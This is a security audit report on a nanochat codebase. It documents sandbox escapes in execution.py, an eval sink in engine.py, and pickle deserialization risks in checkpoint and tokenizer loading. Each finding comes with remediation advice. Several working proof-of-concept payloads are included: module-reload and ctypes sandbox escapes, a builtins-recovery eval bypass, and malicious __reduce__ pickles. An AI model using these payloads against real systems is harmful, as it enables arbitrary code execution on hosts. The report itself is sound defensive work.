Finding 1 — P0 — execution.py is not a security sandbox; model-generated code gets host RCE

Provenance: upstream-inherited from nanochat / HumanEval-style executor.

Evidence. The guard explicitly says it is not a security sandbox:

Python
Run
WARNING
This function is NOT a security sandbox. Untrusted code, including, model-
generated code, should not be blindly executed outside of one.

The code then monkey-patches selected Python module attributes:

Python
Run
os.kill = None
os.system = None
...
subprocess.Popen = None  # type: ignore
...
sys.modules["resource"] = None

and finally executes model-supplied code with an empty globals dict:

Python
Run
exec_globals = {}
...
exec(code, exec_globals)

Those lines are present in the historical repo at nanochat/nanochat/execution.py.

Why this is exploitable. Passing {} as globals does not remove builtins. Python inserts __builtins__ when the globals dict lacks it, and the official docs also warn that exec executes arbitrary code and that overriding builtins is not a security mechanism. 
Python documentation

A concrete payload for execute_code(...):

Python
Run
import importlib, os
importlib.reload(os)
os.system("id > /tmp/nanochat_exec_pwned")

That works because the guard modifies the already-imported os module object; importlib.reload(os) repopulates the module from the real implementation. The same class of bypass applies to subprocess:

Python
Run
import importlib, subprocess
importlib.reload(subprocess)
subprocess.Popen(["/bin/sh", "-c", "id > /tmp/nanochat_subprocess_pwned"])

Even without reload, the guard is incomplete. It disables os.system, os.kill, os.fork, and a handful of filesystem mutators, but not all process-spawning or native-call paths. Examples:

Python
Run
# Not patched in reliability_guard
import os
os.posix_spawn(
    "/bin/sh",
    ["/bin/sh", "-c", "id > /tmp/nanochat_posix_spawn_pwned"],
    os.environ.copy(),
)
Python
Run
# ctypes is explicitly called out as out of scope in the docstring and is not blocked
import ctypes
ctypes.CDLL(None).system(b"id > /tmp/nanochat_ctypes_pwned")

The docstring itself admits network access is not blocked, ctypes may bypass restrictions, and there is no kernel-level isolation. 

execution

Impact. Any path that feeds model-generated Python into execute_code is host command execution under the evaluator’s UID, with local file read/write and likely network egress. The temp directory, timeout, and memory limit reduce accidental damage; they do not stop malicious code.

Fix. Do not treat Python monkey-patching as a sandbox. Run generated code in a real isolation boundary: unprivileged container or microVM, read-only root filesystem, tmpfs workdir, no host secrets mounted, no network by default, seccomp/AppArmor/SELinux, cgroup limits for CPU/memory/PIDs, scrubbed environment, closed inherited FDs, and a killable process tree. If Python-level filtering remains, pass {"__builtins__": {}}, AST-validate, and block imports, but document that this is defense-in-depth only, not the boundary.

Finding 2 — P1 — engine.py has an unsafe eval sink; current filter blocks the classic payload, but the helper is a footgun

Provenance: upstream-inherited pattern; the historical file’s calculator helper matches the upstream structure in the security-relevant part.

Evidence.

Python
Run
return eval(formula, {"__builtins__": {}}, {})

The wrapper is called by eval_with_timeout, and use_calculator filters input before calling it. The current filters are meaningful: math mode permits only digits and arithmetic punctuation and rejects **; string mode only allows letters, digits, quotes, dot, underscore, spaces, and parentheses, then rejects dangerous substrings including __, import, exec, eval, open, globals, locals, dir, and getattr, and requires .count(.

engine

Reachability assessment. The well-known empty-__builtins__ bypass is real against the raw helper, for example:

Python
Run
[c for c in ().__class__.__base__.__subclasses__()
 if c.__name__ == "catch_warnings"][0]()._module.__builtins__["__import__"]("os").system("id")

But through the normal Engine.generate → use_calculator → eval_with_timeout route, I do not see a working bypass in the pasted code: __ is blocked, brackets are not in allowed_chars, commas are not allowed in string mode, and non-.count( expressions are rejected. So this is not a confirmed P0 in the current tool path.

Why it is still a P1. The security boundary is a brittle blacklist wrapped around a known-dangerous primitive. A future “small” expansion of supported string operations, a direct call to eval_with_timeout, or a missing prefilter in another caller turns this into expression-level code execution. Python’s own docs warn that eval executes arbitrary code, and that even overriding __builtins__ is not a security mechanism. 
Python documentation

Fix. Delete eval_with_timeout as a generic helper. Implement a tiny AST interpreter:

Python
Run
# allow only:
# ast.Expression
# ast.Constant for int/float/str
# ast.BinOp with Add/Sub/Mult/Div
# ast.UnaryOp with UAdd/USub
# ast.Call where func is Attribute(Constant(str), "count")

Reject every other node type: Attribute except direct string .count, Subscript, Name, Lambda, Comprehension, Call generally, BoolOp, Compare, etc. For arithmetic, consider ast.parse(expr, mode="eval") plus a deterministic evaluator rather than eval.

Injection source. In the pasted code, I do not see model output, report section names, filenames, env vars, CLI args, or repo metadata flowing into run_command(cmd). So I would not rank this as exploitable command injection today.

Residual risk. run_command is a dangerous utility: the next caller that passes untrusted text becomes shell injection. Finding 4 — P1 — Checkpoint loading is unsafe deserialization via torch.load

Provenance: upstream-inherited in checkpoint_manager.py; additionally exposed by historical/original helper convert_to_hf.py.

Evidence.

Python
Run

...
optimizer_data = torch.load(optimizer_path, map_location=device)

The path is built from a checkpoint directory and step:

Python
Run

optimizer_path = os.path.join(checkpoint_dir, f"optim_{step:06d}_rank{rank:d}.pt")

checkpoint_manager

convert_to_hf.py exposes this to a caller-supplied checkpoint_dir:

Python
Run
def convert_nanochat_to_hf(checkpoint_dir: str, step: int, output_dir: str):
...
model_data, _, meta_data = load_checkpoint(checkpoint_dir, step, "cpu", load_optimizer=False)

convert_to_hf

PyTorch’s docs state that torch.load uses an unpickler under the hood and say never to load data from an untrusted source. 
docs.pytorch.org

Concrete exploit. An attacker who can place or convince the user to load a malicious checkpoint can get code execution at load time:

Python
Run
# attacker creates model_000001.pt
import os, torch

class Pwn:
    def __reduce__(self):
        return (os.system, ("id > /tmp/torch_checkpoint_pwned",))

torch.save(Pwn(), "model_000001.pt")

Then any call equivalent to:

Python
Run
load_checkpoint("/path/to/attacker/checkpoint_dir", 1, "cpu")

runs the reducer during deserialization.

Impact. Local artifact RCE. In normal self-training workflows this is “load only your own checkpoints,” but ML repos routinely exchange checkpoints; if downloaded checkpoints are treated as trusted, this becomes a practical supply-chain RCE.

Fix. Prefer safetensors for model weights. If staying with PyTorch serialization, use a PyTorch version with weights_only=True and call:

Python
Run
torch.load(model_path, map_location=device, weights_only=True)

Then schema-check that the result is exactly a dict[str, torch.Tensor] with expected keys, dtypes, shapes, and no extra objects. Add SHA-256/signature manifests for released checkpoints. Make untrusted loading an explicit opt-in such as --trust-checkpoint-pickle.

The loader also reads token_bytes.pt with torch.load:

...

tokenizer

The base directory can be redirected by NANOCHAT_BASE_DIR, and get_tokenizer() looks under that base directory’s tokenizer/ subdirectory. 

common

Python’s pickle docs are explicit: pickle is not secure, malicious pickle data can execute arbitrary code during unpickling, and only trusted data should be unpickled. 
Python documentation

Concrete exploit.

Python
Run
# attacker creates $NANOCHAT_BASE_DIR/tokenizer/tokenizer.pkl
import os, pickle

class Pwn:
    def __reduce__(self):
        return (os.system, ("id > /tmp/tokenizer_pickle_pwned",))

with open("tokenizer.pkl", "wb") as f:
    pickle.dump(Pwn(), f)

Then any code path that calls get_tokenizer() and sees tokenizer.pkl first triggers pickle.load.

Impact. Local artifact RCE via tokenizer cache poisoning, malicious release bundles, or an attacker-controlled NANOCHAT_BASE_DIR. The token_bytes.pt load is lower complexity because it is intended to be a simple tensor, but it is still a pickle-backed PyTorch file unless loaded with a restricted mode.

Fix. Remove tokenizer.pkl from the default trusted path. Prefer tokenizer.json, which the historical fork already supports, or rebuild the tiktoken encoding from a JSON/manifest format. Gate pickle behind an explicit --allow-unsafe-tokenizer-pickle. Store token_bytes as .npy, JSON, raw binary with shape/dtype manifest, or safetensors; if using torch.load, use weights_only=True and validate that the object is exactly an integer tensor of length vocab_size.

Verdict on the model-code sandbox

The execution.py sandbox is not sound. It is an accident-reduction wrapper, not an adversarial sandbox. It runs model-generated code with full Python builtins, import capability, native-code escape paths, filesystem access, and network access, while relying on bypassable monkey-patching. The comments already say this, and the implementation confirms it. The engine.py calculator path is much narrower and I do not see a working subclass-traversal exploit through the current use_calculator filters, but the raw eval_with_timeout helper should still be removed or replaced with an AST interpreter.

scripts/chat_web.py / any web UI or API surface needs separate review for auth, CORS, prompt-to-tool exposure, and whether it can remotely trigger code execution.

common.download_file_with_lock(url, filename) should be traced through every caller; if any caller accepts untrusted url or filename, it could become SSRF or path traversal under the nanochat base directory.
